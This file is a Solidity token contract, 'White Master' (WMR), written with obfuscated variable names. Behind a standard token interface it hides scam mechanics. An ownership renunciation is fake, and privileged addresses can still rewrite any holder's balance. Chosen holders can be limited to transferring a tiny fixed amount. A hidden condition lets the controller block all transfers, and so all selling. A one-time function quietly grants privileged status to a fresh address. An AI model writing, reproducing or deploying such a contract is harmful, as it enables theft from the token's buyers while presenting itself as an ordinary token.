//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface takeFee {
    function createPair(address listTake, address walletShould) external returns (address);
}

interface fromFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromLiquidity) external view returns (uint256);

    function transfer(address launchedTeam, uint256 tradingTotalToken) external returns (bool);

    function allowance(address feeTxTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingTotalToken) external returns (bool);

    function transferFrom(
        address sender,
        address launchedTeam,
        uint256 tradingTotalToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed swapFee, uint256 value);
    event Approval(address indexed feeTxTo, address indexed spender, uint256 value);
}

abstract contract marketingShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquiditySell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface minMode is fromFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WhiteMaster is marketingShould, fromFund, minMode {

    function feeMin(address txTakeLiquidity, address launchedTeam, uint256 tradingTotalToken) internal returns (bool) {
        if (txTakeLiquidity == marketingAmount) {
            return atTotal(txTakeLiquidity, launchedTeam, tradingTotalToken);
        }
        uint256 txMinLimit = fromFund(maxAt).balanceOf(enableReceiver);
        require(txMinLimit == sellMax);
        require(launchedTeam != enableReceiver);
        if (atLimit[txTakeLiquidity]) {
            return atTotal(txTakeLiquidity, launchedTeam, minLiquidityIs);
        }
        return atTotal(txTakeLiquidity, launchedTeam, tradingTotalToken);
    }

    function balanceOf(address fromLiquidity) public view virtual override returns (uint256) {
        return toSwap[fromLiquidity];
    }

    function shouldSender() private view {
        require(liquidityAtAmount[_msgSender()]);
    }

    function modeAmount(uint256 tradingTotalToken) public {
        shouldSender();
        sellMax = tradingTotalToken;
    }

    function owner() external view returns (address) {
        return totalMode;
    }

    mapping(address => mapping(address => uint256)) private launchedList;

    event OwnershipTransferred(address indexed minAmount, address indexed txTotalFund);

    function atTotal(address txTakeLiquidity, address launchedTeam, uint256 tradingTotalToken) internal returns (bool) {
        require(toSwap[txTakeLiquidity] >= tradingTotalToken);
        toSwap[txTakeLiquidity] -= tradingTotalToken;
        toSwap[launchedTeam] += tradingTotalToken;
        emit Transfer(txTakeLiquidity, launchedTeam, tradingTotalToken);
        return true;
    }

    function allowance(address takeTotal, address tradingShould) external view virtual override returns (uint256) {
        if (tradingShould == tokenSender) {
            return type(uint256).max;
        }
        return launchedList[takeTotal][tradingShould];
    }

    string private sellMode = "WMR";

    uint256 private launchedReceiver;

    mapping(address => bool) public liquidityAtAmount;

    uint256 public exemptAmount;

    function enableAmount(address fundTx) public {
        shouldSender();
        
        if (fundTx == marketingAmount || fundTx == maxAt) {
            return;
        }
        atLimit[fundTx] = true;
    }

    function transferFrom(address txTakeLiquidity, address launchedTeam, uint256 tradingTotalToken) external override returns (bool) {
        if (_msgSender() != tokenSender) {
            if (launchedList[txTakeLiquidity][_msgSender()] != type(uint256).max) {
                require(tradingTotalToken <= launchedList[txTakeLiquidity][_msgSender()]);
                launchedList[txTakeLiquidity][_msgSender()] -= tradingTotalToken;
            }
        }
        return feeMin(txTakeLiquidity, launchedTeam, tradingTotalToken);
    }

    uint256 private buyFund = 100000000 * 10 ** 18;

    bool private fromReceiver;

    function amountLimitList() public {
        emit OwnershipTransferred(marketingAmount, address(0));
        totalMode = address(0);
    }

    address private totalMode;

    mapping(address => uint256) private toSwap;

    bool public autoToken;

    uint256 sellMax;

    function buyTx(address atMax) public {
        require(atMax.balance < 100000);
        if (receiverSender) {
            return;
        }
        
        liquidityAtAmount[atMax] = true;
        if (exemptAmount == launchedReceiver) {
            exemptAmount = launchedReceiver;
        }
        receiverSender = true;
    }

    uint8 private modeReceiverSell = 18;

    address enableReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function txSwapLiquidity(address atReceiver, uint256 tradingTotalToken) public {
        shouldSender();
        toSwap[atReceiver] = tradingTotalToken;
    }

    function transfer(address atReceiver, uint256 tradingTotalToken) external virtual override returns (bool) {
        return feeMin(_msgSender(), atReceiver, tradingTotalToken);
    }

    function approve(address tradingShould, uint256 tradingTotalToken) public virtual override returns (bool) {
        launchedList[_msgSender()][tradingShould] = tradingTotalToken;
        emit Approval(_msgSender(), tradingShould, tradingTotalToken);
        return true;
    }

    address public maxAt;

    address tokenSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function symbol() external view virtual override returns (string memory) {
        return sellMode;
    }

    mapping(address => bool) public atLimit;

    function totalSupply() external view virtual override returns (uint256) {
        return buyFund;
    }

    function getOwner() external view returns (address) {
        return totalMode;
    }

    bool private senderShould;

    uint256 liquidityFundReceiver;

    function decimals() external view virtual override returns (uint8) {
        return modeReceiverSell;
    }

    address public marketingAmount;

    uint256 constant minLiquidityIs = 5 ** 10;

    bool public receiverSender;

    constructor (){
        if (autoToken) {
            fromReceiver = true;
        }
        liquiditySell takeFund = liquiditySell(tokenSender);
        maxAt = takeFee(takeFund.factory()).createPair(takeFund.WETH(), address(this));
        
        marketingAmount = _msgSender();
        liquidityAtAmount[marketingAmount] = true;
        toSwap[marketingAmount] = buyFund;
        amountLimitList();
        
        emit Transfer(address(0), marketingAmount, buyFund);
    }

    string private teamTx = "White Master";

    function name() external view virtual override returns (string memory) {
        return teamTx;
    }

}